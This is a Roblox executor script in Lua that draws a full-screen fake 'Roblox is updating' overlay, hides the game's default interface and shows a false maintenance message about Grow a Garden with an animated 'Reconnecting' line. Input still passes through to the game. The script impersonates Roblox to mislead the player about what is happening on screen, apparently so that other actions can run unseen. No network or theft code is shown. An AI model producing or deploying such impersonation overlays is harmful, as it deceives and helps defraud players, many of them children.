local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer

-- Hide all default Roblox UI elements
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "FakeRobloxUpdateOverlay"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Fullscreen black frame
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.BackgroundTransparency = 1
background.ZIndex = 999999999
background.Active = false -- let input pass through
background.Parent = gui

-- Fake ROBLOX logo
local robloxLogo = Instance.new("TextLabel")
robloxLogo.Size = UDim2.new(1, 0, 0, 100)
robloxLogo.Position = UDim2.new(0.5, 0, 0.3, 0)
robloxLogo.AnchorPoint = Vector2.new(0.5, 0.5)
robloxLogo.BackgroundTransparency = 1
robloxLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
robloxLogo.Font = Enum.Font.GothamBlack
robloxLogo.TextScaled = true
robloxLogo.Text = "ROBLOX"
robloxLogo.TextTransparency = 1
robloxLogo.ZIndex = 1000000000
robloxLogo.Parent = gui

-- Maintenance message
local message = Instance.new("TextLabel")
message.Size = UDim2.new(0.8, 0, 0.2, 0)
message.Position = UDim2.new(0.5, 0, 0.5, 0)
message.AnchorPoint = Vector2.new(0.5, 0.5)
message.BackgroundTransparency = 1
message.TextColor3 = Color3.fromRGB(255, 255, 255)
message.Font = Enum.Font.Gotham
message.TextScaled = true
message.TextWrapped = true
message.Text = "Roblox is having issues with Grow a Garden.\nPlease wait while we update..."
message.TextTransparency = 1
message.ZIndex = 1000000000
message.Parent = gui

-- Reconnecting animation
local reconnect = Instance.new("TextLabel")
reconnect.Size = UDim2.new(0.8, 0, 0.1, 0)
reconnect.Position = UDim2.new(0.5, 0, 0.65, 0)
reconnect.AnchorPoint = Vector2.new(0.5, 0.5)
reconnect.BackgroundTransparency = 1
reconnect.TextColor3 = Color3.fromRGB(255, 255, 255)
reconnect.Font = Enum.Font.GothamMedium
reconnect.TextScaled = true
reconnect.Text = "Reconnecting"
reconnect.TextTransparency = 1
reconnect.ZIndex = 1000000000
reconnect.Parent = gui

-- Add to CoreGui
if gethui then
	gui.Parent = gethui()
elseif syn and syn.protect_gui then
	syn.protect_gui(gui)
	gui.Parent = game:GetService("CoreGui")
else
	gui.Parent = game:GetService("CoreGui")
end

-- Tween in logo + text
TweenService:Create(background, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
TweenService:Create(robloxLogo, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
TweenService:Create(message, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
TweenService:Create(reconnect, TweenInfo.new(0.8), {TextTransparency = 0}):Play()

-- Animate "Reconnecting..."
task.spawn(function()
	while gui and gui.Parent do
		for i = 0, 3 do
			reconnect.Text = "Reconnecting" .. string.rep(".", i)
			task.wait(0.5)
		end
	end
end)
